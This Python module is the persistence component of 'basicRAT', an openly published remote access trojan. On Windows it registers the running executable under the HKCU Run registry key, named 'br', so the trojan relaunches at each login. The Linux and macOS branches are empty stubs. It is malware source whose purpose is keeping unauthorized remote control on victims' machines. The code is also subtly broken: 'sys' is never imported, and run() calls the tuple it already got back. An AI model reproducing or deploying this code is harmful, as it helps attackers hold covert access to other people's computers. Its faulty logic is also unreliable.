# -*- coding: utf-8 -*-

#
# basicRAT persistence module
# https://github.com/vesche/basicRAT
#


def windows_persistence():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU

    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    bin_path = sys.executable

    try:
        reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, 'br', 0, _winreg.REG_SZ, bin_path)
        _winreg.CloseKey(reg_key)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'


def linux_persistence():
    return False, 'nothing here yet'


def mac_persistence():
    return False, 'nothing here yet'


def run(platform):
    if platform.startswith('win'):
        apply_persistence = windows_persistence()
    elif platform.startswith('linux'):
        apply_persistence = linux_persistence()
    elif platform.startswith('darwin'):
        apply_persistence = mac_persistence()
    else:
        return 'Error, platform unsupported.'

    success, details = apply_persistence()
    if success:
        results = 'Persistence successful, {}.'.format(details)
    else:
        results = 'Persistence unsuccessful, {}.'.format(details)

    return results
